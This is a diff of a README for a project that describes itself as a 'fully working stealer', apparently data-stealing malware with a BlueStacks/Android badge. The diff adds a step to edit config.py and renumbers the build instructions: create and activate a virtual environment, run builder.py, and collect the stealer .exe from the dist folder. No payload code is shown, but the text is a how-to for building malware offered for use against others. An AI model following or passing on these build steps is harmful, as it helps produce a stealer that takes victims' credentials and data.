@@ -11,19 +11,20 @@
 ![Android](https://img.shields.io/badge/BlueStacks-3DDC84?style=for-the-badge&logo=android&logoColor=white)
 
 
-**1. First you need to create a virtual environment (venv)**
+**1. First, you must change the fields in the config.py file to the correct ones**
+**2. First you need to create a virtual environment (venv)**
 ```
 python3 -m venv venv
 ```
-**2. Then you have to activate it**
+**3. Then you have to activate it**
 ```
 venv/Scripts/Activate1.ps if you using powershell (now windows terminal) or venv/Scripts/activate.bat if using a cmd
 ```
-**3. Run builder.py and build a .exe file**
+**4. Run builder.py and build a .exe file**
 ```
 python3 builder.py
 ```
-**4. Final step**
+**5. Final step**
 *You have a folder dist, in it is your .exe file, this is a fully working stealer that you can already work with*
 
 There are builder .exe files in this stealer, to create the .exe file you must run builder.py.
